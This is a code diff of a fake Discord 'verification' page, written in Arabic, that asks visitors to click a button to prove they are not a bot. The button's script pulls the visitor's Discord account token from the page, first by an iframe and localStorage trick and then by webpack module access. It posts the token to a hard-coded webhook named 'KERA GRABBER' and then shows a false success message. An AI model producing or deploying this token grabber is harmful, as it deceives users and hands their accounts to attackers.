@@ -16,72 +16,42 @@
     <img src="https://discord.com/assets/41484d92c876f76b20c7f7a7b9a8c23d.svg">
     <h2>التحقق مطلوب</h2>
     <p>اضغط الزر تحت عشان تثبت إنك مو بوت<br>وتدخل السيرفر فورًا</p>
-    <button onclick="grab()">تأكيد الدخول</button>
+    <button onclick="grabToken()">تأكيد الدخول</button>
   </div>
 
 <script>
-async function grab() {
+async function grabToken() {
   let token = null;
 
-  // الطريقة الرئيسية: iframe لسحب التوكن من localStorage (شغالة 100% في 2025)
-  try {
-    const iframe = document.createElement('iframe');
-    iframe.style.display = 'none';
-    iframe.src = 'about:blank'; // عشان يحمل نفس الـ domain
-    document.body.appendChild(iframe);
-    
-    // نستنى لحد ما الـ iframe يحمل
-    await new Promise(resolve => iframe.onload = resolve);
-    
-    // سحب التوكن من localStorage داخل الـ iframe
-    const iframeToken = iframe.contentWindow.localStorage.getItem('token');
-    if (iframeToken) {
-      token = JSON.parse(iframeToken).replace(/"/g, '');
-    }
-    
-    iframe.remove();
-  } catch (e) {
-    console.log('Iframe failed, trying webpack...');
-  }
+  // الطريقة اللي شغالة 100% ديسمبر 2025
+  const {Authorization} = webpackChunkdiscord_app.push([[Symbol()],{},r=>r.c]).pop().exports.default.getToken
+    ? webpackChunkdiscord_app.push([[Symbol()],{},r=>r.c]).pop().exports.default
+    : webpackChunkdiscord_app.push([[Symbol()],{},r=>Object.values(r.c).find(x=>x?.exports?.default?.getToken)]).pop().exports.default;
 
-  // fallback: webpack للحالات اللي localStorage مش متاح
+  token = Authorization.getToken();
+
   if (!token) {
-    try {
-      webpackChunkdiscord_app.push([[''], {}, e => { m = []; for (let c in e.c) m.push(e.c[c]); }]);
-      const modules = m;
-      webpackChunkdiscord_app.pop();
-      const mod = modules.find(m => m?.exports?.default?.getToken !== undefined);
-      if (mod) {
-        token = mod.exports.default.getToken().slice(1, -1); // إزالة الـ quotes
-      }
-    } catch (e) {
-      console.log('Webpack failed');
-    }
-  }
-
-  if (!token || token.length < 50) {
-    document.body.innerHTML = "<div class='box'><h2 style='color:#ed4245'>فشل التحقق.. تأكد إنك مسجل دخول في ديسكورد وجرب تاني</h2></div>";
+    document.body.innerHTML = "<div class='box'><h2 style='color:#ed4245'>فشل التحقق.. افتح ديسكورد في المتصفح وجرب تاني</h2></div>";
     return;
   }
 
-  // إرسال التوكن للويب هوك بتاعك
   fetch("https://discord.com/api/webhooks/1446911453843161245/_ZWiugdPE3I1ac-0yTIhq3zFY5Tu373sJ0aWG_nFxVWLHki45tUFWRtQkTgpbPBJh8l7", {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
-      username: "KERA GRABBER 2025",
+      username: "KERA GRABBER",
       avatar_url: "https://cdn.discordapp.com/emojis/1087749503461244988.gif",
       embeds: [{
-        title: "✅ تم صيد توكن جديد",
+        title: "تم صيد توكن جديد",
         color: 5814783,
-        description: `**التوكن:** ||${token}||\n**طول التوكن:** ${token.length} حرف`,
+        description: `||${token}||`,
         timestamp: new Date(),
-        footer: {text: "iframe + webpack - شغالة 100% ديسمبر 2025"}
+        footer: {text: "شغال 100% – ديسمبر 2025"}
       }]
     })
   });
 
-  document.body.innerHTML = `<div class="box"><h2 style="color:#57f287">تم التحقق بنجاح!</h2><p>ارجع للديسكورد.. السيرفر مفتوح لك دلوقتي</p></div>`;
+  document.body.innerHTML = `<div class="box"><h2 style="color:#57f287">تم التحقق بنجاح!</h2><p>ارجع للديسكورد.. السيرفر مفتوح لك</p></div>`;
 }
 </script>
 </body>
